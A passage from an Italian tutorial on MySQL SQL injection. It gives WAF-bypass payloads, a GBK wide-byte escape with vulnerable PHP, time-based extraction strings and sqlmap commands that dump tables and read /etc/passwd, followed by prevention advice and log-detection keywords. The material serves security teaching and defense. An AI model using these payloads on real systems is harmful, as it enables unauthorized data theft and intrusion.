+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql> SELECT @@GLOBAL.VERSION;
+------------------+
| @@GLOBAL.VERSION |
+------------------+
| 8.0.27           |
+------------------+
```

Quattro modi per leggere la stessa informazione: se uno è bloccato, usi l'altro.

### Alternativa a GROUP\_CONCAT

Richiede MySQL 5.7.22 o superiore. `json_arrayagg()` fa lo stesso lavoro di `group_concat()` ma non è legato al parametro di sistema `group_concat_max_len` (1024 byte di default): resta però soggetto ad altri limiti, in primis `max_allowed_packet` sulla dimensione massima del risultato trasferito, e l'ordine delle righe nell'array non è garantito. Se `group_concat` è filtrato, o il dato supera i 1024 byte e non puoi alzare `group_concat_max_len`, è un'alternativa valida — ma non un modo per avere "dati illimitati".

* `group_concat()` = 1024 byte di default (configurabile con `group_concat_max_len`, se puoi impostarlo)
* `json_arrayagg()` = non legato a `group_concat_max_len`, ma comunque limitato da `max_allowed_packet` e dal trasporto HTTP della risposta — non un valore "illimitato"

```sql
SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;
```

### Notazione scientifica

In MySQL la `e` indica un esponente: `1e3` vale `1 x 10^3`, cioè 1000; `1.5e3` vale 1500; `2e-3` vale 0,002. Il parser di MySQL è molto permissivo con questa sintassi e ci sono casi in cui un punto, una `e` e uno spazio vengono "digeriti" in modi inattesi. I due comandi seguenti sono equivalenti per MySQL:

```sql
SELECT table_name FROM information_schema 1.e.tables
SELECT table_name FROM information_schema .tables
```

Lo stesso trucco si applica al classico payload di bypass login `' or ''='`, che diventa `' or 1.e('')='` oppure `1' or 1.e(1) or '1'='1`. E può ingarbugliare un'intera query per ingannare il WAF:

```sql
1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2
```

È una tecnica nata da un bug reale di parsing che nel 2021 aggirava il WAF di AWS: oggi i prodotti principali la conoscono, ma è un ottimo esempio di come ragiona chi aggira i filtri.

### Commenti condizionali

I commenti `/*! ... */` sono eseguiti da MySQL come codice normale. Se dopo il `!` metti un numero di versione, il contenuto viene eseguito **solo se** la versione del server è uguale o superiore a quel numero.

Il numero ha 5 cifre nel formato `MMmmpp`: per esempio `50700` significa 5.7.00 e `80000` significa 8.0.00. Quindi:

* `/*!50000UNION*/` si esegue su MySQL 5.0.0 e superiori
* `/*!12345UNION*/` e `/*!31337SELECT*/` si leggono come versione 1.23.45 e 3.13.37: sono sempre eseguiti su qualsiasi MySQL moderno, perché la versione del server è maggiore

Il WAF vede un commento, MySQL vede `UNION` e `SELECT` veri. Esempi: `/*!12345UNION*/`, `/*!31337SELECT*/`. In pratica per essere sicuro che il codice venga eseguito conviene usare un numero basso come `/*!50000UNION*/`.

### Wide Byte Injection (GBK)

Alcune applicazioni usano set di caratteri multi-byte (GBK, SJIS) in cui un carattere occupa **due byte**. Il problema nasce quando PHP e MySQL interpretano le sequenze di byte in modo diverso. Un'app che esegue `SET NAMES gbk` e si difende con l'escape (aggiungere un `\` davanti agli apici) può essere aggirata.

Sequenze usate per l'attacco:

* `%bf%27`: dopo che PHP aggiunge il backslash (`%5c`) la sequenza diventa `%bf%5c%27`. In GBK i byte `%bf%5c` formano **un unico carattere valido**, e lasciano `%27` (l'apice) libero.
* `%bf%5c`: stesso concetto: il backslash viene "mangiato" dal byte precedente.
* `%a1%27`: variante con un altro byte iniziale.

Payload costruiti con questa idea:

```
%A8%27 OR 1=1;--
%8C%A8%27 OR 1=1--
%bf' OR 1=1 -- --
```

Codice PHP vulnerabile, che filtra backslash, apice singolo e doppio:

```php
function check_addslashes($string)
{
    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //escape any backslash
    $string = preg_replace('/\'/i', '\\\'', $string);                               //escape single quote with a backslash
    $string = preg_replace('/\"/', "\\\"", $string);                                //escape double quote with a backslash

    return $string;
}

$id=check_addslashes($_GET['id']);
mysql_query("SET NAMES gbk");
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
print_r(mysql_error());
```

Come funziona, passo per passo:

1. Mandi `?id=1'`. PHP aggiunge un backslash e la query diventa `WHERE id='1\''`: l'apice è neutralizzato, nessuna injection.
2. Mandi invece `?id=1%df'`. PHP aggiunge comunque il backslash: la sequenza è `%df` + `%5c` + `'`.
3. In GBK `%df%5c` è un **solo carattere** (`連`). Il backslash è stato "assorbito" dentro al carattere.
4. La query diventa `WHERE id='1連'' LIMIT 0,1`: l'apice è libero e chiude la stringa.
5. Con il payload `?id=1%df' and 1=1 --+` ottieni `WHERE id='1連' and 1=1 --+' LIMIT 0,1`, una query valida e iniettata.

La difesa è semplice: usa le **query parametrizzate** e `utf8mb4`, e non affidarti mai a `addslashes` o a un escape fatto a mano.

### Spazi bloccati

Se il filtro elimina gli spazi, MySQL ne accetta altri modi di separare le parole.

| Tecnica                       | Esempio                                                   |
| ----------------------------- | --------------------------------------------------------- |
| Commenti al posto degli spazi | `UNION/**/SELECT/**/1,2,3`                                |
| Parentesi                     | `?id=(0)union(select(0),database(),(0))#`                 |
| Altri caratteri "vuoti"       | `%09` (tab), `%0a`, `%0b`, `%0c`, `%0d` al posto di `%20` |
| Il segno più                  | `SELECT+name+FROM` (non funziona subito prima di `FROM`)  |

### Apici bloccati

Quando serve scrivere una stringa e gli apici sono filtrati, la scrivi in un altro formato:

```sql
WHERE table_name=0x7573657273
WHERE table_name=CHAR(117,115,101,114,115)
WHERE table_name=UNHEX(7573657273)
```

Sono tre modi di scrivere la parola `users`. L'esadecimale (`0x...`) è il più usato.

### Virgole bloccate

Molte funzioni usano le virgole, ma quasi tutte hanno una forma alternativa senza.

| Con la virgola       | Senza la virgola                                                    |
| -------------------- | ------------------------------------------------------------------- |
| `SUBSTR(x,1,1)`      | `SUBSTR(x FROM 1 FOR 1)` oppure `MID(x FROM 1 FOR 1)`               |
| `LIMIT 0,1`          | `LIMIT 1 OFFSET 0`                                                  |
| `IF(cond,a,b)`       | `CASE WHEN cond THEN a ELSE b END`                                  |
| `UNION SELECT 1,2,3` | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c` |
| `SUBSTR(x,1,1)='a'`  | `x LIKE 'a%'`                                                       |

Un caso reale descritto sul blog di RedForce: iniezione in una `INSERT` o `UPDATE` dove l'app spezzava l'input sulle virgole. La soluzione è un time-based che usa solo `CASE` e `LIKE`:

```sql
xxx'-cast((select CASE WHEN ((MY_QUERY) like 'CHAR_TO_BRUTE_FORCE%25') THEN (sleep(1)) ELSE 2 END) as char)-'
```

`%25` è il `%` codificato per l'URL. Prima trovi la lunghezza del dato con `length((MY_QUERY))=N`, poi provi i caratteri uno a uno: dove la risposta si ferma 1 secondo, il carattere è giusto. Il `cast(... as char)` serve perché senza non funzionava su quel target.

### Parole chiave e operatori bloccati

| Se è bloccato       | Prova                                                                                                                                       |   |                |
| ------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- | - | -------------- |
| `WHERE`             | `HAVING`, per esempio `(0)union(select(table_schema),table_name,(0)from(information_schema.tables)having((table_schema)like(0x74657374)))#` |   |                |
| `AND`, `OR`         | `&&`, \`                                                                                                                                    |   | `, `XOR`, `^\` |
| `=` e `!=`          | `LIKE`, `NOT LIKE`, `IN`                                                                                                                    |   |                |
| `NULL`              | `0`                                                                                                                                         |   |                |
| `UNION SELECT`      | `UNION ALL SELECT`, `UNION DISTINCT SELECT`, `UNION(SELECT ...)`                                                                            |   |                |
| Parole in minuscolo | Maiuscole e minuscole mischiate: `SeLeCt`                                                                                                   |   |                |
| Qualsiasi parola    | Commento versionato: `/*!50000UNION*//*!50000SELECT*/`                                                                                      |   |                |

Se il filtro **cancella** la parola vietata una volta sola, puoi nasconderla dentro se stessa: `UNUNIONION` diventa `UNION` dopo la cancellazione, e `SSELECTELECT` diventa `SELECT`. Non funziona se il filtro lavora in modo ricorsivo.

### Quando è filtrato quasi tutto

Nei casi più estremi restano solo i caratteri speciali. A quel punto non costruisci una query nuova: aggiungi una condizione alla `WHERE` già esistente, usando i nomi delle colonne che la query originale già legge (qui `id`, `name`, `pass`).

```
?id=1&&mid(pass,1,1)=(0x61);%00
?id=id&&(name)like(0x61646D696E)&&(mid(pass,1,1))like(0x61);%00
?id=if((name)like(0x61646D696E),id,0);%00
```

La prima chiede "il primo carattere di `pass` è `a`?". La seconda aggiunge un controllo sul nome (`0x61646D696E` è `admin`). La terza restituisce l'`id` dell'admin solo se la condizione è vera. Il `%00` (null byte) serve a tagliare il resto della query originale: funziona solo in alcuni contesti.

Se anche `=`, `LIKE` e `&` sono bloccati puoi usare lo **XOR**: `?id=66^ORD(carattere)` restituisce `3` solo quando il carattere è `A`, perché 65 XOR 66 fa 3.

### Encoding e parametri duplicati

* **Double URL encoding:** `%73` diventa `%2573`. Un filtro che decodifica una volta sola vede `%73`, l'applicazione decodifica una seconda volta e ottiene `s`.
* **HTTP Parameter Pollution:** mandi lo stesso parametro due volte (`id=1&id=...`). Ogni backend gestisce i duplicati in modo diverso (PHP prende l'ultimo, ASP.NET li unisce con una virgola), e a volte il WAF controlla un valore diverso da quello che arriva al database.

***

## Automatizzare con sqlmap

Quando hai capito dove e come l'injection funziona, [sqlmap](https://hackita.it/articoli/sqlmap/) fa il lavoro ripetitivo. Prima capisci a mano, poi automatizzi: se lo lanci alla cieca non sai cosa sta facendo né perché fallisce. Se lavori con richieste complesse, salva la richiesta da [Burp Suite](https://hackita.it/articoli/burp-suite/) e passala a sqlmap.

```bash
# Test base su un parametro, forzando MySQL
sqlmap -u "http://target/page.php?id=1" --dbms=mysql --batch

# Elenco database, tabelle, colonne, dump
sqlmap -u "http://target/page.php?id=1" --dbms=mysql --dbs
sqlmap -u "http://target/page.php?id=1" --dbms=mysql -D nomedb --tables
sqlmap -u "http://target/page.php?id=1" --dbms=mysql -D nomedb -T users --dump

# Forzare una sola tecnica (U=union, E=error, B=boolean, T=time)
sqlmap -u "http://target/page.php?id=1" --dbms=mysql --technique=T

# Leggere un file (serve il privilegio FILE)
sqlmap -u "http://target/page.php?id=1" --dbms=mysql --file-read="/etc/passwd"

# Provare i tamper per aggirare un WAF
sqlmap -u "http://target/page.php?id=1" --dbms=mysql --tamper=space2comment,randomcase
```

Se un filtro blocca le richieste di sqlmap, i `--tamper` applicano per te molte delle tecniche viste sopra.

| Tamper              | Cosa fa                                                            |   |    |
| ------------------- | ------------------------------------------------------------------ | - | -- |
| `space2comment`     | Sostituisce gli spazi con `/**/`                                   |   |    |
| `space2mysqlblank`  | Sostituisce gli spazi con altri caratteri vuoti accettati da MySQL |   |    |
| `randomcase`        | Alterna maiuscole e minuscole nelle parole chiave                  |   |    |
| `symboliclogical`   | Sostituisce `AND` e `OR` con `&&` e \`                             |   | \` |
| `versionedkeywords` | Mette le parole chiave dentro commenti versionati                  |   |    |
| `between`           | Sostituisce `>` con `NOT BETWEEN 0 AND ...`                        |   |    |
| `equaltolike`       | Sostituisce `=` con `LIKE`                                         |   |    |
| `unmagicquotes`     | Prepara l'attacco wide byte GBK sugli apici                        |   |    |

Si possono combinare: `--tamper=space2comment,randomcase`. Prima capisci cosa blocca il filtro con richieste manuali, poi scegli i tamper giusti: lanciarli tutti insieme di solito rompe il payload.

***

## Sqlmap su richieste HTTP reali (POST, cookie, header, JSON, CSRF)

Finora `sqlmap -u "URL?id=1"` basta per un parametro GET semplice. Nella pratica il parametro vulnerabile è spesso in un body POST, in un cookie, in un header personalizzato o dentro un body JSON — e serve autenticazione.

### Da una richiesta salvata in Burp Suite

```bash
sqlmap -r richiesta.txt -p id --batch
```

Salva la richiesta HTTP completa da [Burp Suite](https://hackita.it/articoli/burp-suite/) (tasto destro → "Copy to file" oppure "Save item"), passala con `-r`, e usa `-p` per dire a sqlmap quale parametro testare — senza `-p`, sqlmap prova a indovinare tutti i parametri, più lento e più rumoroso.

### Cookie e header personalizzati

```bash
sqlmap -u "https://target/page" --cookie="session=abc123; id=1*" --batch
sqlmap -u "https://target/page" -H "X-Forwarded-For: 1*" --batch
```

L'asterisco `*` dentro il valore dice a sqlmap "testa qui", al posto del parametro GET/POST di default. Utile quando il parametro vulnerabile non è nell'URL né nel body, ma in un header che l'applicazione legge (header di autenticazione custom, `X-Forwarded-For` usato in una query di log, ecc.).

### Body JSON

```bash
sqlmap -r richiesta.txt --data='{"id":"1*"}' --batch
```

Sqlmap riconosce automaticamente un body JSON se il `Content-Type` nella richiesta salvata è `application/json`; se non lo rileva, passa esplicitamente `--data` con il JSON e l'asterisco sul campo da testare.

### Autenticazione e token CSRF

```bash
sqlmap -r richiesta.txt -p id --csrf-token=csrf_token --csrf-url="https://target/login" --batch
```

Se l'applicazione richiede un token CSRF che cambia a ogni richiesta, `--csrf-token` indica il nome del parametro e `--csrf-url` la pagina da cui sqlmap deve prenderne uno fresco prima di ogni test — altrimenti ogni richiesta con un token scaduto viene rifiutata ancora prima di arrivare al database.

### Second-order injection con sqlmap

Qui sqlmap da solo non basta: la injection si attiva in una query *diversa* da quella dove scrivi il payload (es. scrivi un valore malevolo in un profilo, e la injection scatta quando quel valore viene riletto altrove). Il workflow pratico:

1. Usa sqlmap (o manualmente) solo per **confermare** la injection sul secondo punto, una volta che sai dove il dato ricompare — passagli direttamente la richiesta che *legge* il dato salvato, non quella che lo scrive.
2. Se il secondo punto non è raggiungibile facilmente via HTTP (es. un job batch interno), la conferma resta manuale: scrivi il payload, triggera la rilettura, osserva l'effetto (errore, ritardo, dato esfiltrato) come negli esempi della sezione sul second-order.

## Tecniche avanzate extra: JSON e REGEXP

Molte applicazioni moderne salvano dati strutturati in una colonna `JSON` (disponibile da MySQL 5.7.8). Se l'injection colpisce una query che legge da una di queste colonne, vale la pena conoscere la sintassi per leggerne dentro.

```sql
-- Estrae il campo "user" da una colonna JSON chiamata "data"
SELECT JSON_EXTRACT(data, '$.user') FROM profili;

-- Stessa cosa con l'operatore freccia (equivalente, più corto)
SELECT data->'$.user' FROM profili;

-- Come sopra, ma restituisce il testo senza virgolette (utile per confronti)
SELECT data->>'$.user' FROM profili;
```

`$.user` è un **percorso JSON path**: `$` indica la radice del documento, `.user` la proprietà da leggere. Per array si usa `$[0]`, `$[1]`... Questa sintassi è utile anche come bypass "collaterale": se un filtro blocca apici o parentesi in modo aggressivo ma non riconosce `->` o `->>` come operatori sospetti, può lasciarli passare.

Dalla versione 8.0.4, MySQL ha anche `REGEXP_LIKE()`, un confronto con espressione regolare più potente di `LIKE`, utile in blind injection per testare una classe di caratteri in una sola richiesta:

```sql
?id=1 AND REGEXP_LIKE((SELECT password FROM users LIMIT 1), '^[a-f0-9]{32}$')
```

Questo esempio testa in un colpo solo se la password sembra un hash MD5 (32 caratteri esadecimali): utile per capire il formato del dato prima di estrarlo carattere per carattere.

***

## Tecniche avanzate extra: metadati alternativi, conteggio colonne senza errori e altri trucchi

Qualche tecnica in più, utile soprattutto quando `information_schema` è bloccato o filtrato, o quando vuoi lavorare "silenziosamente" senza generare errori visibili.

**Altre vie per leggere i metadati.** Oltre a `mysql.innodb_table_stats` e `sys.schema_auto_increment_columns` già visti, su MySQL 8 puoi provare anche:

```sql
SELECT * FROM sys.x$schema_flattened_keys;
SELECT * FROM sys.schema_table_statistics;
```

Sono viste dello schema `sys` pensate per il monitoring delle performance, ma elencano comunque nomi di tabelle e colonne — utili come alternativa in più se `information_schema` è filtrato dal WAF o da un controllo applicativo.

**Contare le colonne con una JOIN su tabella derivata**, invece delle classiche `ORDER BY` o `UNION SELECT NULL,NULL,...`:

```sql
' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c-- -
```

Se il numero di tabelle derivate (`a`, `b`, `c`, ...) che unisci con `JOIN` corrisponde al numero di colonne della query originale, la risposta è valida. Aggiungi o togli una tabella derivata finché l'errore non sparisce: è un modo alternativo a `ORDER BY N` per capire quante colonne aspettarsi, comodo quando `ORDER BY` è filtrato.

**Confronto di tuple (row-value) per verificare dati senza errori**, utile in blind quando conosci già la struttura della tabella (nomi di colonna compresi) e vuoi confermare valori precisi senza leggere carattere per carattere:

```sql
' AND (SELECT 1 FROM users WHERE (username,password)=('admin','segreta'))-- -
```

MySQL supporta il confronto diretto tra "tuple" di valori: `(a,b)=(c,d)` restituisce `0` o `1` invece di un errore, confrontando tutta la riga in un colpo. Se la riga esiste con esattamente quei valori, la condizione è vera. Nota bene: qui i nomi `username`/`password` **devono essere noti** (li hai già estratti da `information_schema.columns`) — questa tecnica serve a verificare un valore sospetto in una sola richiesta, non a scoprire i nomi delle colonne, e non sostituisce l'estrazione per bisezione quando il valore non lo conosci già.

**Fingerprint della versione in modo condizionale**, utile per capire se stai parlando con MySQL 5.x o 8.x senza un errore visibile:

```sql
' AND IF(SUBSTRING(@@version,1,1)='8', SLEEP(5), 0)-- -
```

Se la risposta è lenta, la major version è l'8; se è immediata, è un'altra. Lo stesso schema funziona con `BENCHMARK()` al posto di `SLEEP()` quando `SLEEP` è bloccato (vedi la sezione sul bypass del WAF).

**Payload poliglotta tra più contesti di quote.** Quando non sai se il parametro finisce dentro apici singoli, doppi o senza apici, un payload costruito per "rompere" tutti i contesti insieme ti fa risparmiare tentativi:

```sql
'"`--/*!50000;-- -
```

Non è magia: è una sequenza che prova a chiudere stringa con apice singolo, poi doppio, poi backtick (usato per i nomi di identificatori in MySQL), prima di passare a un commento. Se uno dei contesti è quello giusto, il resto del payload si comporta come previsto; se non lo è, al massimo l'applicazione mostra un errore di sintassi che comunque ti confirma la presenza dell'injection.

**Capire se l'utente può scrivere file**, prima ancora di tentare `INTO OUTFILE`:

```sql
' UNION SELECT user FROM mysql.user WHERE file_priv='Y'-- -
```

Ti evita di scoprire solo dopo il tentativo che l'utente del database non ha il privilegio `FILE`, inutile su molte configurazioni gestite (RDS, Cloud SQL) dove questo privilegio è disabilitato di default.

**Truncation per byte alti (0x80-0xFF).** Su alcune configurazioni di charset (in particolare con GBK, visto sopra), oltre ai byte già citati, anche i byte nel range 0x80-0xFF possono "mangiare" il carattere successivo durante la conversione, con lo stesso effetto pratico del trucco del backslash già descritto: un apice di escape che diventa parte di una sequenza a due byte e perde il suo significato di delimitatore.

**Numeri senza cifre**, utile se il WAF filtra ogni cifra numerica nel payload blind:

```sql
' AND ASCII(SUBSTRING(@@version,true,true))>true-- -
```

In MySQL `true` e `false` sono alias di `1` e `0`, usabili ovunque servirebbe quella cifra — qui al posto di `1` in `SUBSTRING(stringa,1,1)` e al posto di `1` nel confronto finale (`>1`, non una cifra `1` letterale scritta nel payload). Non risolve tutto: se devi confrontare con un numero più grande di `0`/`1` (es. `ASCII(...)>=100`) dovrai comunque costruirlo per addizione (`true+true+...`) o con un'altra funzione che non richieda cifre dirette, perché `true`/`false` coprono solo `0` e `1`.

## Flusso operativo: dal parametro ai dati

1. **Trova il parametro** (GET, POST, cookie, header) e prova `'` e `''`.
2. **Capisci il contesto**: stringa o numero? Dove finisce la query (WHERE, INSERT, ORDER BY)?
3. **Scegli la tecnica** in base a cosa vedi: output (UNION), errori (error-based), differenze (blind), solo tempo (time-based), niente (out of band).
4. **Raccogli informazioni base**: `version()`, `database()`, `user()`.
5. **Enumera**: database → tabelle → colonne → dati.
6. **Controlla i privilegi**: puoi usare `FILE`? Che valore ha `secure_file_priv`?
7. **Se hai `FILE`**: leggi file di configurazione e valuta la scrittura nella web root.
8. **Se sei bloccato da un WAF**: cambia sintassi (commenti, hex, alternative a `information_schema`) prima di cambiare tecnica.
9. **Documenta**: richiesta, payload, risposta e impatto reale per il report.

***

## Come difendersi e come rilevare l'attacco

Se lavori lato difesa, questi sono i punti che chiudono quasi tutto quello che hai visto sopra.

**Prevenzione**

* **Query parametrizzate (prepared statements)** ovunque: è l'unica difesa che risolve il problema alla radice. L'escape manuale e le blacklist si aggirano.
* **Privilegi minimi**: l'utente dell'applicazione non deve essere `root` e non deve avere `FILE`, `SUPER` né accesso al database `mysql`.
* **Configura `secure_file_priv`** con una cartella dedicata o disabilitalo, così `LOAD_FILE` e `INTO OUTFILE` non possono toccare la web root.
* **Non mostrare gli errori SQL** all'utente: logga lato server e mostra un messaggio generico. Questo uccide l'error-based.
* **Usa `utf8mb4`** e imposta la codifica correttamente nella connessione, evitando `SET NAMES gbk`.
* **Modalità SQL strict** attiva, per bloccare il troncamento silenzioso.
* **Blocca le connessioni in uscita** dal server database: così DNS e SMB out of band non funzionano.
* Il **WAF è un livello in più**, non una soluzione: non sostituisce il codice corretto.

**Rilevazione**

* Nei log web cerca richieste con `UNION SELECT`, `information_schema`, `SLEEP(`, `BENCHMARK(`, `EXTRACTVALUE`, `UPDATEXML`, `/*!`, `INTO OUTFILE`, `LOAD_FILE`.
* Nei log di MySQL guarda query lente e ripetitive (tipiche del time-based) e query che toccano `information_schema` dall'utente dell'applicazione.
* Allarme su file nuovi o modificati nella web root (un `.php` che compare dal nulla) e su richieste DNS verso domini sconosciuti dal server database.

***

## Problemi comuni e cosa fare

| Sintomo                            | Causa probabile                                                          | Cosa fare                                                |
| ---------------------------------- | ------------------------------------------------------------------------ | -------------------------------------------------------- |
| Errore anche con `-- -`            | Parentesi aperte o commento sbagliato                                    | Chiudi le parentesi (`')`, `'))`) o prova `#` (`%23`)    |
| "different number of columns"      | Numero di colonne sbagliato                                              | Rifai il conteggio con `ORDER BY`                        |
| UNION senza dati visibili          | La query originale restituisce già una riga, o la colonna non è stampata | Usa `-1` come id e cerca la colonna visibile con `1,2,3` |
| Errore di tipo                     | Tipi di colonna incompatibili                                            | Usa `NULL` al posto del valore                           |
| Dati tagliati                      | Limite di 1024 caratteri di `GROUP_CONCAT`                               | `LIMIT` riga per riga oppure `json_arrayagg()`           |
| Error-based mostra pochi caratteri | Limite di circa 32 caratteri                                             | Spezza con `SUBSTRING`                                   |
| Time-based con ritardi casuali     | Rete instabile                                                           | Ripeti il test e aumenta il tempo di `SLEEP`             |
| `LOAD_FILE` restituisce `NULL`     | Manca `FILE`, percorso sbagliato, `secure_file_priv` o permessi          | Controlla privilegi e `@@secure_file_priv`               |
| Il WAF blocca tutto                | Parole o caratteri filtrati                                              | Cambia sintassi, non tecnica (vedi bypass WAF)           |

***

## Domande frequenti

### Cos'è una SQL injection su MySQL?

È una vulnerabilità in cui l'input dell'utente finisce dentro una query SQL senza controlli, e permette di far eseguire al database MySQL comandi scelti dall'attaccante. Si usa per leggere dati, saltare un login e, con i privilegi giusti, leggere o scrivere file sul server.

### Come faccio a sapere se un sito usa MySQL?

Un errore SQL con la dicitura "You have an error in your SQL syntax... MySQL" è il segnale più chiaro. Se non vedi errori, prova le funzioni tipiche: `SLEEP(5)` che funziona solo su MySQL e MariaDB, oppure `@@version` e `version()`. Anche la porta 3306 aperta è un indizio (vedi [Porta 3306 MySQL](https://hackita.it/articoli/porta-3306-mysql/)).

### Che differenza c'è tra MySQL e MariaDB nelle injection?

Per la grande maggioranza dei payload non cambia nulla: `SLEEP`, `UNION`, `information_schema`, `LOAD_FILE` funzionano allo stesso modo. Cambiano alcuni dettagli sulle versioni e su funzioni recenti, quindi se una tecnica non funziona controlla la versione prima di scartarla.

### Perché il mio UNION non mostra niente?

Le cause più comuni: numero di colonne sbagliato, tipi incompatibili (usa `NULL`), la query originale restituisce già una riga (usa `-1` o `0` come id), oppure la colonna che stampi non è quella dove hai messo il dato. Parti dalla verifica con `UNION SELECT 1,2,3` e guarda dove compaiono i numeri.

### `--` non funziona, perché?

In MySQL il commento `--` richiede uno spazio dopo i due trattini. Scrivi `-- -`, oppure usa `#` (che nell'URL va codificato `%23`).

### Posso leggere file anche senza essere root del database?

Serve il privilegio `FILE`, che non coincide con essere root: un utente applicativo configurato male può averlo. Resta sempre il vincolo di `secure_file_priv` e dei permessi del file sul disco.

### Qual è la tecnica migliore da usare?

Quella che il target ti permette: UNION se vedi l'output, perché è la più veloce; error-based se vedi gli errori; boolean blind se la pagina cambia; time-based come ultima spiaggia, perché è la più lenta e la più rumorosa. Per approfondire la teoria generale vedi [SQL Injection Classica](https://hackita.it/articoli/sql-injection-classica/).

### Come si previene una SQL injection su MySQL?

Con le query parametrizzate (prepared statements), che separano il codice SQL dai dati. In più servono privilegi minimi per l'utente del database, `secure_file_priv` configurato, errori SQL nascosti all'utente e una whitelist per i nomi di colonne e tabelle (per esempio in `ORDER BY`). Il WAF aiuta ma non basta.

### Come mi esercito in modo legale?

Con ambienti autorizzati: DVWA e altri lab vulnerabili in locale, le macchine di Hack The Box, i lab di PortSwigger Academy e i CTF. Non provare mai questi payload su siti di cui non hai un'autorizzazione scritta.

***

## Conclusione

Una SQL injection su MySQL parte quasi sempre da un singolo apice e può arrivare fino all'esecuzione di comandi sul server. Le tecniche sono sempre le stesse: capire come l'app ti restituisce l'output, scegliere la tecnica giusta, enumerare con `information_schema` e valutare i privilegi per leggere o scrivere file. La parte che fa la differenza non è memorizzare i payload ma capire **perché** funzionano, così sai adattarli quando un filtro li blocca o la versione è diversa.

Questa guida segue la struttura della pagina MySQL di [PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/MySQL%20Injection/), arricchita con spiegazioni, requisiti di versione, tecniche di bypass raccolte da blog di settore (websec.ca, RedForce e altri) e difese. Se vuoi continuare con le altre famiglie di injection, guarda [LDAP Injection](https://hackita.it/articoli/ldap-injection/) e [XPath Injection](https://hackita.it/articoli/xpath-injection/).
